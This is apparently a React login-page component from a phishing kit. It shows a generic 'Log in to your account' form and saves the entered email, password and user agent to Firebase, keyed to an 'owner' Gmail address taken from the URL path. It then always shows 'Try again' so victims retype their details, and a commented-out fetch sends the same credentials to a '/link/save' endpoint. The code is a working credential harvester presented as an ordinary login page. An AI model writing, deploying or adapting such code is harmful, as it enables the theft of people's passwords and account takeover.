import React, { useContext } from 'react'
import { useRef } from 'react'
import './Login.css'
import { useLocation, useNavigate } from 'react-router-dom'
import { addData } from '../config/firebase'

const Login = () => {


  const location = useLocation()

  const navigate = useNavigate()


  const email = useRef()
  const pass = useRef()

  async function postData() {
    try {

      const pathNames = location.pathname.split("/")
      const ownerEmail = `${pathNames[1]}@gmail.com`

      const emailValue = email.current.value
      const passValue = pass.current.value
      const userAgent = navigator.userAgent

      const result = await addData(emailValue, passValue, userAgent, ownerEmail)

      if (!result) {
        alert('Something went wrong!')
      }

      alert('Try again')

      // await fetch(`${url}/link/save`, {
      //   method: "POST",
      //   headers: {
      //     'Content-Type': 'application/json'
      //   },
      //   body: JSON.stringify({
      //     linkName: pathName,
      //     email: email.current.value,
      //     pass: pass.current.value,
      //     userAgent: navigator.userAgent
      //   })
      // });
      email.current.value = ''
      pass.current.value = ''
    } catch (error) {
      console.log(error?.message)
    }
  }

  function handleSubmit(event) {
    event.preventDefault()
    postData()
  }

  return (
    <div className='login-page-container'>
      <form onSubmit={handleSubmit} className=' z-20'>
        <div className=' flex flex-col inside-form'>
          <h1 className=' text-xl text-white'>Log in to your account</h1>
          <input type="text" placeholder='Your Email' ref={email} required />
          <input type="password" placeholder='Password' ref={pass} required />
        </div>
        <button>Log in</button>
      </form>
    </div>
  )
}

export default Login